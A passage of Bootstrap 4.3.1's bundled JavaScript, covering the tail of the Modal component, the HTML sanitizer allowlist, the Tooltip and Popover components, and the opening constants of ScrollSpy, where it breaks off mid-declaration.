        if (this._isBodyOverflowing && !isModalOverflowing) {
          this._element.style.paddingRight = this._scrollbarWidth + "px";
        }
      };

      _proto._resetAdjustments = function _resetAdjustments() {
        this._element.style.paddingLeft = '';
        this._element.style.paddingRight = '';
      };

      _proto._checkScrollbar = function _checkScrollbar() {
        var rect = document.body.getBoundingClientRect();
        this._isBodyOverflowing = rect.left + rect.right < window.innerWidth;
        this._scrollbarWidth = this._getScrollbarWidth();
      };

      _proto._setScrollbar = function _setScrollbar() {
        var _this9 = this;

        if (this._isBodyOverflowing) {
          // Note: DOMNode.style.paddingRight returns the actual value or '' if not set
          //   while $(DOMNode).css('padding-right') returns the calculated value or 0 if not set
          var fixedContent = [].slice.call(document.querySelectorAll(Selector$5.FIXED_CONTENT));
          var stickyContent = [].slice.call(document.querySelectorAll(Selector$5.STICKY_CONTENT)); // Adjust fixed content padding

          $(fixedContent).each(function (index, element) {
            var actualPadding = element.style.paddingRight;
            var calculatedPadding = $(element).css('padding-right');
            $(element).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + _this9._scrollbarWidth + "px");
          }); // Adjust sticky content margin

          $(stickyContent).each(function (index, element) {
            var actualMargin = element.style.marginRight;
            var calculatedMargin = $(element).css('margin-right');
            $(element).data('margin-right', actualMargin).css('margin-right', parseFloat(calculatedMargin) - _this9._scrollbarWidth + "px");
          }); // Adjust body padding

          var actualPadding = document.body.style.paddingRight;
          var calculatedPadding = $(document.body).css('padding-right');
          $(document.body).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + this._scrollbarWidth + "px");
        }

        $(document.body).addClass(ClassName$5.OPEN);
      };

      _proto._resetScrollbar = function _resetScrollbar() {
        // Restore fixed content padding
        var fixedContent = [].slice.call(document.querySelectorAll(Selector$5.FIXED_CONTENT));
        $(fixedContent).each(function (index, element) {
          var padding = $(element).data('padding-right');
          $(element).removeData('padding-right');
          element.style.paddingRight = padding ? padding : '';
        }); // Restore sticky content

        var elements = [].slice.call(document.querySelectorAll("" + Selector$5.STICKY_CONTENT));
        $(elements).each(function (index, element) {
          var margin = $(element).data('margin-right');

          if (typeof margin !== 'undefined') {
            $(element).css('margin-right', margin).removeData('margin-right');
          }
        }); // Restore body padding

        var padding = $(document.body).data('padding-right');
        $(document.body).removeData('padding-right');
        document.body.style.paddingRight = padding ? padding : '';
      };

      _proto._getScrollbarWidth = function _getScrollbarWidth() {
        // thx d.walsh
        var scrollDiv = document.createElement('div');
        scrollDiv.className = ClassName$5.SCROLLBAR_MEASURER;
        document.body.appendChild(scrollDiv);
        var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
      } // Static
        ;

      Modal._jQueryInterface = function _jQueryInterface(config, relatedTarget) {
        return this.each(function () {
          var data = $(this).data(DATA_KEY$5);

          var _config = _objectSpread({}, Default$3, $(this).data(), typeof config === 'object' && config ? config : {});

          if (!data) {
            data = new Modal(this, _config);
            $(this).data(DATA_KEY$5, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config](relatedTarget);
          } else if (_config.show) {
            data.show(relatedTarget);
          }
        });
      };

      _createClass(Modal, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$5;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default$3;
        }
      }]);

      return Modal;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(document).on(Event$5.CLICK_DATA_API, Selector$5.DATA_TOGGLE, function (event) {
    var _this10 = this;

    var target;
    var selector = Util.getSelectorFromElement(this);

    if (selector) {
      target = document.querySelector(selector);
    }

    var config = $(target).data(DATA_KEY$5) ? 'toggle' : _objectSpread({}, $(target).data(), $(this).data());

    if (this.tagName === 'A' || this.tagName === 'AREA') {
      event.preventDefault();
    }

    var $target = $(target).one(Event$5.SHOW, function (showEvent) {
      if (showEvent.isDefaultPrevented()) {
        // Only register focus restorer if modal will actually get shown
        return;
      }

      $target.one(Event$5.HIDDEN, function () {
        if ($(_this10).is(':visible')) {
          _this10.focus();
        }
      });
    });

    Modal._jQueryInterface.call($(target), config, this);
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME$5] = Modal._jQueryInterface;
  $.fn[NAME$5].Constructor = Modal;

  $.fn[NAME$5].noConflict = function () {
    $.fn[NAME$5] = JQUERY_NO_CONFLICT$5;
    return Modal._jQueryInterface;
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): tools/sanitizer.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  var uriAttrs = ['background', 'cite', 'href', 'itemtype', 'longdesc', 'poster', 'src', 'xlink:href'];
  var ARIA_ATTRIBUTE_PATTERN = /^aria-[\w-]*$/i;
  var DefaultWhitelist = {
    // Global attributes allowed on any supplied element below.
    '*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],
    a: ['target', 'href', 'title', 'rel'],
    area: [],
    b: [],
    br: [],
    col: [],
    code: [],
    div: [],
    em: [],
    hr: [],
    h1: [],
    h2: [],
    h3: [],
    h4: [],
    h5: [],
    h6: [],
    i: [],
    img: ['src', 'alt', 'title', 'width', 'height'],
    li: [],
    ol: [],
    p: [],
    pre: [],
    s: [],
    small: [],
    span: [],
    sub: [],
    sup: [],
    strong: [],
    u: [],
    ul: []
    /**
     * A pattern that recognizes a commonly useful subset of URLs that are safe.
     *
     * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
     */

  };
  var SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|$))/gi;
  /**
   * A pattern that matches safe data URLs. Only matches image, video and audio types.
   *
   * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
   */

  var DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i;

  function allowedAttribute(attr, allowedAttributeList) {
    var attrName = attr.nodeName.toLowerCase();

    if (allowedAttributeList.indexOf(attrName) !== -1) {
      if (uriAttrs.indexOf(attrName) !== -1) {
        return Boolean(attr.nodeValue.match(SAFE_URL_PATTERN) || attr.nodeValue.match(DATA_URL_PATTERN));
      }

      return true;
    }

    var regExp = allowedAttributeList.filter(function (attrRegex) {
      return attrRegex instanceof RegExp;
    }); // Check if a regular expression validates the attribute.

    for (var i = 0, l = regExp.length; i < l; i++) {
      if (attrName.match(regExp[i])) {
        return true;
      }
    }

    return false;
  }

  function sanitizeHtml(unsafeHtml, whiteList, sanitizeFn) {
    if (unsafeHtml.length === 0) {
      return unsafeHtml;
    }

    if (sanitizeFn && typeof sanitizeFn === 'function') {
      return sanitizeFn(unsafeHtml);
    }

    var domParser = new window.DOMParser();
    var createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');
    var whitelistKeys = Object.keys(whiteList);
    var elements = [].slice.call(createdDocument.body.querySelectorAll('*'));

    var _loop = function _loop(i, len) {
      var el = elements[i];
      var elName = el.nodeName.toLowerCase();

      if (whitelistKeys.indexOf(el.nodeName.toLowerCase()) === -1) {
        el.parentNode.removeChild(el);
        return "continue";
      }

      var attributeList = [].slice.call(el.attributes);
      var whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);
      attributeList.forEach(function (attr) {
        if (!allowedAttribute(attr, whitelistedAttributes)) {
          el.removeAttribute(attr.nodeName);
        }
      });
    };

    for (var i = 0, len = elements.length; i < len; i++) {
      var _ret = _loop(i, len);

      if (_ret === "continue") continue;
    }

    return createdDocument.body.innerHTML;
  }

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$6 = 'tooltip';
  var VERSION$6 = '4.3.1';
  var DATA_KEY$6 = 'bs.tooltip';
  var EVENT_KEY$6 = "." + DATA_KEY$6;
  var JQUERY_NO_CONFLICT$6 = $.fn[NAME$6];
  var CLASS_PREFIX = 'bs-tooltip';
  var BSCLS_PREFIX_REGEX = new RegExp("(^|\\s)" + CLASS_PREFIX + "\\S+", 'g');
  var DISALLOWED_ATTRIBUTES = ['sanitize', 'whiteList', 'sanitizeFn'];
  var DefaultType$4 = {
    animation: 'boolean',
    template: 'string',
    title: '(string|element|function)',
    trigger: 'string',
    delay: '(number|object)',
    html: 'boolean',
    selector: '(string|boolean)',
    placement: '(string|function)',
    offset: '(number|string|function)',
    container: '(string|element|boolean)',
    fallbackPlacement: '(string|array)',
    boundary: '(string|element)',
    sanitize: 'boolean',
    sanitizeFn: '(null|function)',
    whiteList: 'object'
  };
  var AttachmentMap$1 = {
    AUTO: 'auto',
    TOP: 'top',
    RIGHT: 'right',
    BOTTOM: 'bottom',
    LEFT: 'left'
  };
  var Default$4 = {
    animation: true,
    template: '<div class="tooltip" role="tooltip">' + '<div class="arrow"></div>' + '<div class="tooltip-inner"></div></div>',
    trigger: 'hover focus',
    title: '',
    delay: 0,
    html: false,
    selector: false,
    placement: 'top',
    offset: 0,
    container: false,
    fallbackPlacement: 'flip',
    boundary: 'scrollParent',
    sanitize: true,
    sanitizeFn: null,
    whiteList: DefaultWhitelist
  };
  var HoverState = {
    SHOW: 'show',
    OUT: 'out'
  };
  var Event$6 = {
    HIDE: "hide" + EVENT_KEY$6,
    HIDDEN: "hidden" + EVENT_KEY$6,
    SHOW: "show" + EVENT_KEY$6,
    SHOWN: "shown" + EVENT_KEY$6,
    INSERTED: "inserted" + EVENT_KEY$6,
    CLICK: "click" + EVENT_KEY$6,
    FOCUSIN: "focusin" + EVENT_KEY$6,
    FOCUSOUT: "focusout" + EVENT_KEY$6,
    MOUSEENTER: "mouseenter" + EVENT_KEY$6,
    MOUSELEAVE: "mouseleave" + EVENT_KEY$6
  };
  var ClassName$6 = {
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector$6 = {
    TOOLTIP: '.tooltip',
    TOOLTIP_INNER: '.tooltip-inner',
    ARROW: '.arrow'
  };
  var Trigger = {
    HOVER: 'hover',
    FOCUS: 'focus',
    CLICK: 'click',
    MANUAL: 'manual'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Tooltip =
    /*#__PURE__*/
    function () {
      function Tooltip(element, config) {
        /**
         * Check for Popper dependency
         * Popper - https://popper.js.org
         */
        if (typeof Popper === 'undefined') {
          throw new TypeError('Bootstrap\'s tooltips require Popper.js (https://popper.js.org/)');
        } // private


        this._isEnabled = true;
        this._timeout = 0;
        this._hoverState = '';
        this._activeTrigger = {};
        this._popper = null; // Protected

        this.element = element;
        this.config = this._getConfig(config);
        this.tip = null;

        this._setListeners();
      } // Getters


      var _proto = Tooltip.prototype;

      // Public
      _proto.enable = function enable() {
        this._isEnabled = true;
      };

      _proto.disable = function disable() {
        this._isEnabled = false;
      };

      _proto.toggleEnabled = function toggleEnabled() {
        this._isEnabled = !this._isEnabled;
      };

      _proto.toggle = function toggle(event) {
        if (!this._isEnabled) {
          return;
        }

        if (event) {
          var dataKey = this.constructor.DATA_KEY;
          var context = $(event.currentTarget).data(dataKey);

          if (!context) {
            context = new this.constructor(event.currentTarget, this._getDelegateConfig());
            $(event.currentTarget).data(dataKey, context);
          }

          context._activeTrigger.click = !context._activeTrigger.click;

          if (context._isWithActiveTrigger()) {
            context._enter(null, context);
          } else {
            context._leave(null, context);
          }
        } else {
          if ($(this.getTipElement()).hasClass(ClassName$6.SHOW)) {
            this._leave(null, this);

            return;
          }

          this._enter(null, this);
        }
      };

      _proto.dispose = function dispose() {
        clearTimeout(this._timeout);
        $.removeData(this.element, this.constructor.DATA_KEY);
        $(this.element).off(this.constructor.EVENT_KEY);
        $(this.element).closest('.modal').off('hide.bs.modal');

        if (this.tip) {
          $(this.tip).remove();
        }

        this._isEnabled = null;
        this._timeout = null;
        this._hoverState = null;
        this._activeTrigger = null;

        if (this._popper !== null) {
          this._popper.destroy();
        }

        this._popper = null;
        this.element = null;
        this.config = null;
        this.tip = null;
      };

      _proto.show = function show() {
        var _this = this;

        if ($(this.element).css('display') === 'none') {
          throw new Error('Please use show on visible elements');
        }

        var showEvent = $.Event(this.constructor.Event.SHOW);

        if (this.isWithContent() && this._isEnabled) {
          $(this.element).trigger(showEvent);
          var shadowRoot = Util.findShadowRoot(this.element);
          var isInTheDom = $.contains(shadowRoot !== null ? shadowRoot : this.element.ownerDocument.documentElement, this.element);

          if (showEvent.isDefaultPrevented() || !isInTheDom) {
            return;
          }

          var tip = this.getTipElement();
          var tipId = Util.getUID(this.constructor.NAME);
          tip.setAttribute('id', tipId);
          this.element.setAttribute('aria-describedby', tipId);
          this.setContent();

          if (this.config.animation) {
            $(tip).addClass(ClassName$6.FADE);
          }

          var placement = typeof this.config.placement === 'function' ? this.config.placement.call(this, tip, this.element) : this.config.placement;

          var attachment = this._getAttachment(placement);

          this.addAttachmentClass(attachment);

          var container = this._getContainer();

          $(tip).data(this.constructor.DATA_KEY, this);

          if (!$.contains(this.element.ownerDocument.documentElement, this.tip)) {
            $(tip).appendTo(container);
          }

          $(this.element).trigger(this.constructor.Event.INSERTED);
          this._popper = new Popper(this.element, tip, {
            placement: attachment,
            modifiers: {
              offset: this._getOffset(),
              flip: {
                behavior: this.config.fallbackPlacement
              },
              arrow: {
                element: Selector$6.ARROW
              },
              preventOverflow: {
                boundariesElement: this.config.boundary
              }
            },
            onCreate: function onCreate(data) {
              if (data.originalPlacement !== data.placement) {
                _this._handlePopperPlacementChange(data);
              }
            },
            onUpdate: function onUpdate(data) {
              return _this._handlePopperPlacementChange(data);
            }
          });
          $(tip).addClass(ClassName$6.SHOW); // If this is a touch-enabled device we add extra
          // empty mouseover listeners to the body's immediate children;
          // only needed because of broken event delegation on iOS
          // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html

          if ('ontouchstart' in document.documentElement) {
            $(document.body).children().on('mouseover', null, $.noop);
          }

          var complete = function complete() {
            if (_this.config.animation) {
              _this._fixTransition();
            }

            var prevHoverState = _this._hoverState;
            _this._hoverState = null;
            $(_this.element).trigger(_this.constructor.Event.SHOWN);

            if (prevHoverState === HoverState.OUT) {
              _this._leave(null, _this);
            }
          };

          if ($(this.tip).hasClass(ClassName$6.FADE)) {
            var transitionDuration = Util.getTransitionDurationFromElement(this.tip);
            $(this.tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
          } else {
            complete();
          }
        }
      };

      _proto.hide = function hide(callback) {
        var _this2 = this;

        var tip = this.getTipElement();
        var hideEvent = $.Event(this.constructor.Event.HIDE);

        var complete = function complete() {
          if (_this2._hoverState !== HoverState.SHOW && tip.parentNode) {
            tip.parentNode.removeChild(tip);
          }

          _this2._cleanTipClass();

          _this2.element.removeAttribute('aria-describedby');

          $(_this2.element).trigger(_this2.constructor.Event.HIDDEN);

          if (_this2._popper !== null) {
            _this2._popper.destroy();
          }

          if (callback) {
            callback();
          }
        };

        $(this.element).trigger(hideEvent);

        if (hideEvent.isDefaultPrevented()) {
          return;
        }

        $(tip).removeClass(ClassName$6.SHOW); // If this is a touch-enabled device we remove the extra
        // empty mouseover listeners we added for iOS support

        if ('ontouchstart' in document.documentElement) {
          $(document.body).children().off('mouseover', null, $.noop);
        }

        this._activeTrigger[Trigger.CLICK] = false;
        this._activeTrigger[Trigger.FOCUS] = false;
        this._activeTrigger[Trigger.HOVER] = false;

        if ($(this.tip).hasClass(ClassName$6.FADE)) {
          var transitionDuration = Util.getTransitionDurationFromElement(tip);
          $(tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }

        this._hoverState = '';
      };

      _proto.update = function update() {
        if (this._popper !== null) {
          this._popper.scheduleUpdate();
        }
      } // Protected
        ;

      _proto.isWithContent = function isWithContent() {
        return Boolean(this.getTitle());
      };

      _proto.addAttachmentClass = function addAttachmentClass(attachment) {
        $(this.getTipElement()).addClass(CLASS_PREFIX + "-" + attachment);
      };

      _proto.getTipElement = function getTipElement() {
        this.tip = this.tip || $(this.config.template)[0];
        return this.tip;
      };

      _proto.setContent = function setContent() {
        var tip = this.getTipElement();
        this.setElementContent($(tip.querySelectorAll(Selector$6.TOOLTIP_INNER)), this.getTitle());
        $(tip).removeClass(ClassName$6.FADE + " " + ClassName$6.SHOW);
      };

      _proto.setElementContent = function setElementContent($element, content) {
        if (typeof content === 'object' && (content.nodeType || content.jquery)) {
          // Content is a DOM node or a jQuery
          if (this.config.html) {
            if (!$(content).parent().is($element)) {
              $element.empty().append(content);
            }
          } else {
            $element.text($(content).text());
          }

          return;
        }

        if (this.config.html) {
          if (this.config.sanitize) {
            content = sanitizeHtml(content, this.config.whiteList, this.config.sanitizeFn);
          }

          $element.html(content);
        } else {
          $element.text(content);
        }
      };

      _proto.getTitle = function getTitle() {
        var title = this.element.getAttribute('data-original-title');

        if (!title) {
          title = typeof this.config.title === 'function' ? this.config.title.call(this.element) : this.config.title;
        }

        return title;
      } // Private
        ;

      _proto._getOffset = function _getOffset() {
        var _this3 = this;

        var offset = {};

        if (typeof this.config.offset === 'function') {
          offset.fn = function (data) {
            data.offsets = _objectSpread({}, data.offsets, _this3.config.offset(data.offsets, _this3.element) || {});
            return data;
          };
        } else {
          offset.offset = this.config.offset;
        }

        return offset;
      };

      _proto._getContainer = function _getContainer() {
        if (this.config.container === false) {
          return document.body;
        }

        if (Util.isElement(this.config.container)) {
          return $(this.config.container);
        }

        return $(document).find(this.config.container);
      };

      _proto._getAttachment = function _getAttachment(placement) {
        return AttachmentMap$1[placement.toUpperCase()];
      };

      _proto._setListeners = function _setListeners() {
        var _this4 = this;

        var triggers = this.config.trigger.split(' ');
        triggers.forEach(function (trigger) {
          if (trigger === 'click') {
            $(_this4.element).on(_this4.constructor.Event.CLICK, _this4.config.selector, function (event) {
              return _this4.toggle(event);
            });
          } else if (trigger !== Trigger.MANUAL) {
            var eventIn = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSEENTER : _this4.constructor.Event.FOCUSIN;
            var eventOut = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSELEAVE : _this4.constructor.Event.FOCUSOUT;
            $(_this4.element).on(eventIn, _this4.config.selector, function (event) {
              return _this4._enter(event);
            }).on(eventOut, _this4.config.selector, function (event) {
              return _this4._leave(event);
            });
          }
        });
        $(this.element).closest('.modal').on('hide.bs.modal', function () {
          if (_this4.element) {
            _this4.hide();
          }
        });

        if (this.config.selector) {
          this.config = _objectSpread({}, this.config, {
            trigger: 'manual',
            selector: ''
          });
        } else {
          this._fixTitle();
        }
      };

      _proto._fixTitle = function _fixTitle() {
        var titleType = typeof this.element.getAttribute('data-original-title');

        if (this.element.getAttribute('title') || titleType !== 'string') {
          this.element.setAttribute('data-original-title', this.element.getAttribute('title') || '');
          this.element.setAttribute('title', '');
        }
      };

      _proto._enter = function _enter(event, context) {
        var dataKey = this.constructor.DATA_KEY;
        context = context || $(event.currentTarget).data(dataKey);

        if (!context) {
          context = new this.constructor(event.currentTarget, this._getDelegateConfig());
          $(event.currentTarget).data(dataKey, context);
        }

        if (event) {
          context._activeTrigger[event.type === 'focusin' ? Trigger.FOCUS : Trigger.HOVER] = true;
        }

        if ($(context.getTipElement()).hasClass(ClassName$6.SHOW) || context._hoverState === HoverState.SHOW) {
          context._hoverState = HoverState.SHOW;
          return;
        }

        clearTimeout(context._timeout);
        context._hoverState = HoverState.SHOW;

        if (!context.config.delay || !context.config.delay.show) {
          context.show();
          return;
        }

        context._timeout = setTimeout(function () {
          if (context._hoverState === HoverState.SHOW) {
            context.show();
          }
        }, context.config.delay.show);
      };

      _proto._leave = function _leave(event, context) {
        var dataKey = this.constructor.DATA_KEY;
        context = context || $(event.currentTarget).data(dataKey);

        if (!context) {
          context = new this.constructor(event.currentTarget, this._getDelegateConfig());
          $(event.currentTarget).data(dataKey, context);
        }

        if (event) {
          context._activeTrigger[event.type === 'focusout' ? Trigger.FOCUS : Trigger.HOVER] = false;
        }

        if (context._isWithActiveTrigger()) {
          return;
        }

        clearTimeout(context._timeout);
        context._hoverState = HoverState.OUT;

        if (!context.config.delay || !context.config.delay.hide) {
          context.hide();
          return;
        }

        context._timeout = setTimeout(function () {
          if (context._hoverState === HoverState.OUT) {
            context.hide();
          }
        }, context.config.delay.hide);
      };

      _proto._isWithActiveTrigger = function _isWithActiveTrigger() {
        for (var trigger in this._activeTrigger) {
          if (this._activeTrigger[trigger]) {
            return true;
          }
        }

        return false;
      };

      _proto._getConfig = function _getConfig(config) {
        var dataAttributes = $(this.element).data();
        Object.keys(dataAttributes).forEach(function (dataAttr) {
          if (DISALLOWED_ATTRIBUTES.indexOf(dataAttr) !== -1) {
            delete dataAttributes[dataAttr];
          }
        });
        config = _objectSpread({}, this.constructor.Default, dataAttributes, typeof config === 'object' && config ? config : {});

        if (typeof config.delay === 'number') {
          config.delay = {
            show: config.delay,
            hide: config.delay
          };
        }

        if (typeof config.title === 'number') {
          config.title = config.title.toString();
        }

        if (typeof config.content === 'number') {
          config.content = config.content.toString();
        }

        Util.typeCheckConfig(NAME$6, config, this.constructor.DefaultType);

        if (config.sanitize) {
          config.template = sanitizeHtml(config.template, config.whiteList, config.sanitizeFn);
        }

        return config;
      };

      _proto._getDelegateConfig = function _getDelegateConfig() {
        var config = {};

        if (this.config) {
          for (var key in this.config) {
            if (this.constructor.Default[key] !== this.config[key]) {
              config[key] = this.config[key];
            }
          }
        }

        return config;
      };

      _proto._cleanTipClass = function _cleanTipClass() {
        var $tip = $(this.getTipElement());
        var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX);

        if (tabClass !== null && tabClass.length) {
          $tip.removeClass(tabClass.join(''));
        }
      };

      _proto._handlePopperPlacementChange = function _handlePopperPlacementChange(popperData) {
        var popperInstance = popperData.instance;
        this.tip = popperInstance.popper;

        this._cleanTipClass();

        this.addAttachmentClass(this._getAttachment(popperData.placement));
      };

      _proto._fixTransition = function _fixTransition() {
        var tip = this.getTipElement();
        var initConfigAnimation = this.config.animation;

        if (tip.getAttribute('x-placement') !== null) {
          return;
        }

        $(tip).removeClass(ClassName$6.FADE);
        this.config.animation = false;
        this.hide();
        this.show();
        this.config.animation = initConfigAnimation;
      } // Static
        ;

      Tooltip._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = $(this).data(DATA_KEY$6);

          var _config = typeof config === 'object' && config;

          if (!data && /dispose|hide/.test(config)) {
            return;
          }

          if (!data) {
            data = new Tooltip(this, _config);
            $(this).data(DATA_KEY$6, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Tooltip, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$6;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default$4;
        }
      }, {
        key: "NAME",
        get: function get() {
          return NAME$6;
        }
      }, {
        key: "DATA_KEY",
        get: function get() {
          return DATA_KEY$6;
        }
      }, {
        key: "Event",
        get: function get() {
          return Event$6;
        }
      }, {
        key: "EVENT_KEY",
        get: function get() {
          return EVENT_KEY$6;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType$4;
        }
      }]);

      return Tooltip;
    }();
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  $.fn[NAME$6] = Tooltip._jQueryInterface;
  $.fn[NAME$6].Constructor = Tooltip;

  $.fn[NAME$6].noConflict = function () {
    $.fn[NAME$6] = JQUERY_NO_CONFLICT$6;
    return Tooltip._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$7 = 'popover';
  var VERSION$7 = '4.3.1';
  var DATA_KEY$7 = 'bs.popover';
  var EVENT_KEY$7 = "." + DATA_KEY$7;
  var JQUERY_NO_CONFLICT$7 = $.fn[NAME$7];
  var CLASS_PREFIX$1 = 'bs-popover';
  var BSCLS_PREFIX_REGEX$1 = new RegExp("(^|\\s)" + CLASS_PREFIX$1 + "\\S+", 'g');

  var Default$5 = _objectSpread({}, Tooltip.Default, {
    placement: 'right',
    trigger: 'click',
    content: '',
    template: '<div class="popover" role="tooltip">' + '<div class="arrow"></div>' + '<h3 class="popover-header"></h3>' + '<div class="popover-body"></div></div>'
  });

  var DefaultType$5 = _objectSpread({}, Tooltip.DefaultType, {
    content: '(string|element|function)'
  });

  var ClassName$7 = {
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector$7 = {
    TITLE: '.popover-header',
    CONTENT: '.popover-body'
  };
  var Event$7 = {
    HIDE: "hide" + EVENT_KEY$7,
    HIDDEN: "hidden" + EVENT_KEY$7,
    SHOW: "show" + EVENT_KEY$7,
    SHOWN: "shown" + EVENT_KEY$7,
    INSERTED: "inserted" + EVENT_KEY$7,
    CLICK: "click" + EVENT_KEY$7,
    FOCUSIN: "focusin" + EVENT_KEY$7,
    FOCUSOUT: "focusout" + EVENT_KEY$7,
    MOUSEENTER: "mouseenter" + EVENT_KEY$7,
    MOUSELEAVE: "mouseleave" + EVENT_KEY$7
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Popover =
    /*#__PURE__*/
    function (_Tooltip) {
      _inheritsLoose(Popover, _Tooltip);

      function Popover() {
        return _Tooltip.apply(this, arguments) || this;
      }

      var _proto = Popover.prototype;

      // Overrides
      _proto.isWithContent = function isWithContent() {
        return this.getTitle() || this._getContent();
      };

      _proto.addAttachmentClass = function addAttachmentClass(attachment) {
        $(this.getTipElement()).addClass(CLASS_PREFIX$1 + "-" + attachment);
      };

      _proto.getTipElement = function getTipElement() {
        this.tip = this.tip || $(this.config.template)[0];
        return this.tip;
      };

      _proto.setContent = function setContent() {
        var $tip = $(this.getTipElement()); // We use append for html objects to maintain js events

        this.setElementContent($tip.find(Selector$7.TITLE), this.getTitle());

        var content = this._getContent();

        if (typeof content === 'function') {
          content = content.call(this.element);
        }

        this.setElementContent($tip.find(Selector$7.CONTENT), content);
        $tip.removeClass(ClassName$7.FADE + " " + ClassName$7.SHOW);
      } // Private
        ;

      _proto._getContent = function _getContent() {
        return this.element.getAttribute('data-content') || this.config.content;
      };

      _proto._cleanTipClass = function _cleanTipClass() {
        var $tip = $(this.getTipElement());
        var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX$1);

        if (tabClass !== null && tabClass.length > 0) {
          $tip.removeClass(tabClass.join(''));
        }
      } // Static
        ;

      Popover._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = $(this).data(DATA_KEY$7);

          var _config = typeof config === 'object' ? config : null;

          if (!data && /dispose|hide/.test(config)) {
            return;
          }

          if (!data) {
            data = new Popover(this, _config);
            $(this).data(DATA_KEY$7, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Popover, null, [{
        key: "VERSION",
        // Getters
        get: function get() {
          return VERSION$7;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default$5;
        }
      }, {
        key: "NAME",
        get: function get() {
          return NAME$7;
        }
      }, {
        key: "DATA_KEY",
        get: function get() {
          return DATA_KEY$7;
        }
      }, {
        key: "Event",
        get: function get() {
          return Event$7;
        }
      }, {
        key: "EVENT_KEY",
        get: function get() {
          return EVENT_KEY$7;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType$5;
        }
      }]);

      return Popover;
    }(Tooltip);
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  $.fn[NAME$7] = Popover._jQueryInterface;
  $.fn[NAME$7].Constructor = Popover;

  $.fn[NAME$7].noConflict = function () {
    $.fn[NAME$7] = JQUERY_NO_CONFLICT$7;
    return Popover._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$8 = 'scrollspy';
  var VERSION$8 = '4.3.1';
  var DATA_KEY$8 = 'bs.scrollspy';
  var EVENT_KEY$8 = "." + DATA_KEY$8;
  var DATA_API_KEY$6 = '.data-api';
  var JQUERY_NO_CONFLICT$8 = $.fn[NAME$8];
  var Default$6 = {
    offset: 10,
    method: 'auto',
    target: ''
  };
  var DefaultType$6 = {
    offset: 'number',
    method: 'string',
    target: '(string|element)'
  };
  var Event$8 = {
    ACTIVATE: "activate" + EVENT_KEY$8,
    SCROLL: "scroll" + EVENT_KEY$8,
    LOAD_DATA_API: "load" + EVENT_KEY$8 + DATA_API_KEY$6
  };
  var ClassName$8 = {
    DROPDOWN_ITEM: 'dropdown-item',
    DROPDOWN_MENU: 'dropdown-menu',
    ACTIVE: 'active'
  };
  var Selector$8 = {
    DATA_SPY: '[data-spy="scroll"]',
    ACTIVE: '.active',
    NAV_LIST_GROUP: '.nav, .list-group',
    NAV_LINKS: '.nav-link',
    NAV_ITEMS: '.nav-item',
    LIST_ITEMS: '.list-group-item',
    DROPDOWN: '.dropdown',
    DROPDOWN_ITEMS: '.dropdown-item',
    DROPDOWN_TOGGLE: '.dropdown-toggle'
  };
  var OffsetMethod = {
    OFFSET: 'offset',
    POSITION: 'position'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var ScrollSpy =
